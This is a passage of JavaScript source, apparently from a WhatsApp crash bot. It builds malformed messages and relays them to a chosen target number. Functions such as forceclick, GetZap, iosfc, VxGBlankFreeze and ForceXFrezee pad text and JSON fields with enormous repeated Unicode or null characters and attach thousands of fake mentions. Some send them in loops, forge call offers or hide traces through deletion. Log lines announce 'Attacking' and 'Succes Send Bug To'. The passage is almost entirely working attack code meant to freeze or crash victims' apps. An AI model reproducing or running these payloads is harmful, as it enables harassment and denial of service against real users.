              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function forceclick(sock, target) {
  try {
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/6yiozp.jpg" } },
      { upload: sock.waUploadToServer }
    );

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
              },
            },
            carouselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                    hasMediaAttachment: true,
                    media: media.imageMessage,
                  },
                  body: {
                    text:
                      "Me Xata" + "ꦽ".repeat(50000),
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Open",
                          url: "https://wa.me/6282128666306",
                        }),
                      },
                    ],
                    messageParamsJson: "{}",
                  },
                },
                
                {
                  header: {
                    hasMediaAttachment: true,
                    media: media.imageMessage,
                  },
                  body: {
                    text:
                      "Button Params" + "ꦽ".repeat(50000),
                  },
                  nativeFlowMessage: {
                    messageParamsJson: "Joined Group",
                    buttons: [
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                    ],
                  },
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, { messageId: null });
    console.log("FORCE CLICK DONE SEND✅");
  } catch (err) {
    console.error("Bug Error❌ :", err);
  }
}

async function FORCEDELETE(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  let CallAudio = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch { }
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let AudioLite = CallAudio();
  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let BufferDelete = sock.createParticipantNodes.bind(sock);
  let encodeBuffer = sock.encodeWAMessage?.bind(sock);
  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let participateNode = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(participateNode.map(async ({ recipientJid: jid, message: msg }) => {

      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;

      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));

      return AudioLite.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });

    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };
  let BytesType = crypto.randomBytes(32);
  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);

  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );
  let DecodeCall = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(DecodeCall);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "JOIN GRUP",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });

}

async function CrashNewsletter(target) {
  await sock.relayMessage(target, {
    groupStatusMentionMessage: {
      message: {
        protocolMessage: {
          key: {
            participant: "131355550002@s.whatsapp.net", 
            remoteJid: "status@broadcast", 
            id: ''
          }, 
          type: "STATUS_MENTION_MESSAGE"
        }
      }
    }
  }, {}) 
}

async function Gyxlores(target) {
    try {
        await sock.relayMessage(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32)
                        },
                        eventMessage: {
                            isCanceled: false,
                            name: "X",
                            description: "Dick Your Big",
                            location: {
                                degreesLatitude: "a",
                                degreesLongitude: "a",
                                name: "X"
                            },
                            joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                            startTime: "1714957200",
                            thumbnailDirectPath: "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzZodTIxai5qcGc=",
                            thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                            thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                            mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                            mediaKeyTimestamp: Date.now(),
                            contextInfo: {
                                mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                                remoteJid: "status@broadcast",
                                participant: "0@s.whatsapp.net",
                                fromMe: false,
                                isForwarded: true,
                                forwardingScore: 9999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "1@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "X"
                                },
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "X",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: 'address_message',
                                            paramsJson: "\x10".repeat(1000000),
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            },
            {
                ephemeralExpiration: 5,
                timeStamp: Date.now()
            }
        );
        let etc = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "X",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000),
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                userJid: target,
                quoted: null
            }
        );

        await sock.relayMessage(target, etc.message, {
            participant: { jid: target }
        });
    } catch (err) {
        console.error("Error:", err);
    }
}

async function SpamInvis(target) {
  const head = {
    extendedTextMessage: {
      text: null,
      matchedText: null,
      description: null,
      title: null,
      paymentLinkMetadata: {
        button: { displayText: " X" },
        header: { headerType: 1 },
        provider: { paramsJson: "{{".repeat(10000) },
      },
      linkPreviewMetadata: {
        paymentLinkMetadata: {
          button: { displayText: "X" },
          header: { headerType: 1 },
          provider: { paramsJson: "{{".repeat(10000) },
        },
        urlMetadata: { fbExperimentId: 999 },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221,
      },
    },
  };

  const x = {
    groupStatusMessageV2: {
      message: head,
    },
  };

  const msg = generateWAMessageFromContent(target, x, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
    userJid: target,
  });

  setTimeout(async () => {
  await sock.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: msg.key.id,
      participant: target
    }
  });
});
}

async function GetZap(sock, target) {
  try {
    console.log(chalk.red("---( Attacking )----"));
    for (let i = 0; i < 900; i++) {
    let TraViZap = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body: {
          text: "lixx",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "SpecX - #RilzX7",
          paramsJson: `\u0000`.repeat(1045000),
          version: 3
        },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 97410,
          forwardedNewsletterMessageInfo: {
            newsletterName: "TheRilyzySixCoreX",
            newsletterJid: "120363309802495518@newsletter",
            serverMessageId: 1
          }
        }
      }
    }, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: TraViZap.message
        }
      },
      {
        messageId: TraViZap.key.id,
        participant: { jid: target }
      }
    );
   }
  } catch (err) {
    console.error(err);
  }
}

async function iosfc(target) {
  let msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      contextInfo: {
        statusAttributionType: "RESHARED_FROM_POST"
      }, 
      text: "Amelia Kill You" + "𑇂𑆵𑆴𑆿".repeat(60000), 
      matchedText: "t.me/aboutMeX7", 
      groupInviteLinkType: "DEFAULT"
    }
  }, {});
  
  await client.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid:target },
  });
}

async function odx(sock, target) {
    const aa = "𑜦𑜠".repeat(20000) + "𑜦𑜠".repeat(60000);
    
    let msg = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
                    fileLength: "999999999999",
                    height: 999999999,
                    width: 999999999,
                    mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
                    fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
                    directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1762488513",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABEv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFEETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjosoqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
                    caption: aa,  
                    contextInfo: {
                        mentionedJid: [
                            ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                        ],
                        isForwarded: true,
                        forwadingScore: 999,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "696969696969@newsletter",
                            serverMessageId: 1,
                            newsletterName: "pinjem ven",
                        }
                    }
                }
            }
        }
    };

    const ondet = generateWAMessageFromContent(target, msg, {});

    await sock.relayMessage("status@broadcast", ondet.message, {
        messageId: ondet.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    let msg2 = {
        ephemeralMessage: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "𑜦𑜠".repeat(20000),
                                format: "DEFAULT",
                            },
                            contextInfo: {
                                mentionedJid: [
                                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                                ],
                                isForwarded: true,
                                forwadingScore: 999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "696969696969@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "pinjem ven",
                                }
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "{}".repeat(30000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }; 

    const tai = generateWAMessageFromContent(target, msg2, {});

    await sock.relayMessage("status@broadcast", tai.message, {
        messageId: tai.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
}

async function HyperSixty(sock, target) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}

async function VxGBlankFreeze(sock, target) {
 const Msg1 = {
  interactiveMessage: {
     contextInfo: {
          stanzaId: "VxGBlankFreeze.id" + Date.now(),
                isForwarding: true,
                   forwardingScore: 999,
                     participant: target,
                        remoteJid: "status@broadcast",
                        mentionedJid: [
                          "13333335502@s.whatsapp.net",
                            ...Array.from(
                            { length: 5 }, () => 
                        "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 18144000000,
                            },
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 99999),
                            creatorName: "Yanz And Sarz",
                        },
                   hasMediaAttachment: false
               },
           },
     viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(1500),
          address: "ꦽ".repeat(1000),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "./sock.js" + "𑜦𑜠".repeat(25000),
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: false,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "LIXX BOSSS ANTI AMPAZ" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "𑜦𑜠".repeat(25000),
                  "flow_message_version": "3"
                })
              }
            ],
            messageParamsJson: "{",
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            forwardingScore: 999,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: " X ",
            stanzaId: "666",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          },
        },
      },
    },
  }, {
    participant: {
      jid: target
    }
  });
}

async function ForceXFrezee(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "Amelia Kill You" + "ꦾ".repeat(77777),
      publisher: "Amelia",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "lixx Kill You" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "lixx Kill You" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Send Bug To ${target}`));
}

async function DelayInvis(sock, target) {
  try {
    const longTitle = "Testing" + "ꦽ".repeat(5000);
    const longJson = "{}".repeat(5000);
    const longFlow = "ꦽ".repeat(4500);
    const longButtonTitle = "𑲭𑲭".repeat(5000);
    
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };
    
    const content = {
      message: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: longTitle,
              },
              body: {
                text: "Testing Sedot Kuota",
              },
              nativeFlowMessage: {
                messageParamsJson: longJson,
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: longButtonTitle,
                      sections: [
                        {
                          title: "kill you",
                          rows: [],
                        },
                      ],
                    }),
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "DEFAULT",
                      flow_cta: longFlow,
                      flow_message_version: "3",
                    }),
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "DEFAULT",
                      flow_cta: longFlow,
                      flow_message_version: "3",
                    }),
                  },
                ],
              },
              messageParamsJson: longJson,
            },
          },
        },
      },
    };
    
    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "t.me/RizFavboy",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
